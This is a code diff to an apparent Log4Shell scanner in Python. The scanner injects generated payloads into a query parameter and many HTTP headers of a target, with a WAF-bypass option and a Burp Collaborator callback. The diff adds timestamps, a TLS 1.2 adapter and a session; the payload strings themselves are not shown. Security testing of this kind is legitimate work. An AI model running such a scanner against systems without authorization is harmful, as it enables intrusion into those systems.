@@ -3,7 +3,11 @@
 import argparse
 import requests
 import random
-import urllib3
+import datetime
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.poolmanager import PoolManager
+import ssl
 
 # Colors
 red = '\033[31m'
@@ -17,11 +21,10 @@ endc = '\033[m'
 info = blue + "[*]" + endc
 error = red + "[x]" + endc
 query = yellow + "[?]" + endc
-payload = green + "[#]" + endc
 gen = purple + "[%]" + endc
 
 # Supress URLLIB3 Warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Arg Parser
 parser = argparse.ArgumentParser()
@@ -87,6 +90,14 @@ headers = {"User-Agent": "{{payload}}",
            "DNT": "{{payload}}",
            "Cache-Control": "{{payload}}"}
 
+# Force TLS v1.2
+class MyAdapter(HTTPAdapter):
+    def init_poolmanager(self, connections, maxsize, block=False):
+        self.poolmanager = PoolManager(num_pools=connections,
+                                       maxsize=maxsize,
+                                       block=block,
+                                       ssl_version=ssl.PROTOCOL_TLSv1_2)
+
 
 def check_up(check_url, burp):
     # TARGET Connection / Value Check
@@ -101,7 +112,7 @@ def check_up(check_url, burp):
         exit()
     # BURP Connection / Value Check
     try:
-        requests.request(url="https://" + burp,
+        requests.request(url=burp,
                          method="GET",
                          params={"/": "LOG4BURP-CHECKUP"},
                          verify=False,
@@ -125,14 +136,19 @@ def generate_payloads(local_host):
 
 def scan_target(scan_url, brp_address, request_timeout):
     formatted_payloads = generate_payloads(brp_address)
+    session = requests.session()
+    session.mount('https://', MyAdapter())
     if args.waf_bypass is False:
         print(gen + purple, "[ PAYLOAD ]", endc)
         print(gen, formatted_payloads[0])
         for current_header in headers:
             try:
-                print(payload, f"URL: {scan_url} | PAYLOAD: {formatted_payloads[0]} | HEADER: {current_header}")
+                # TIMESTAMP
+                now = datetime.datetime.now()
+                current_time = now.strftime("%H:%M:%S")
+                print(green + f"[{current_time}]" + endc, f"URL: {scan_url} | PAYLOAD: {formatted_payloads[0]} | HEADER: {current_header}")
                 # Send Custom GET Request
-                requests.request(url=scan_url,
+                session.request(url=scan_url,
                                  method="GET",
                                  params={"v": formatted_payloads[0]},
                                  headers={current_header: formatted_payloads[0]},
@@ -147,9 +163,12 @@ def scan_target(scan_url, brp_address, request_timeout):
         for current_payload in formatted_payloads:
             for current_header in headers:
                 try:
-                    print(payload, f"URL: {scan_url} | PAYLOAD: {current_payload} | HEADER: {current_header}")
+                    # TIMESTAMP
+                    now = datetime.datetime.now()
+                    current_time = now.strftime("%H:%M:%S")
+                    print(green + f"[{current_time}]" + endc, f"URL: {scan_url} | PAYLOAD: {current_payload} | HEADER: {current_header}")
                     # Send Custom GET Request
-                    requests.request(url=scan_url,
+                    session.request(url=scan_url,
                                      method="GET",
                                      params={"v": current_payload},
                                      headers={current_header: current_payload},
@@ -192,7 +211,7 @@ if __name__ == '__main__':
         # Value Check
         print(info + blue, "[ SETTINGS ]", endc)
         print(info, "TARGET:" + blue, target_url, endc)
-        print(info, "COLLABORATOR:" + blue, "https://" + collaborator, endc)
+        print(info, "COLLABORATOR:" + blue, collaborator, endc)
         print(info, "TIMEOUT:" + blue, timeout, endc)
         # CheckUp
         if args.ignore_checkup is True:
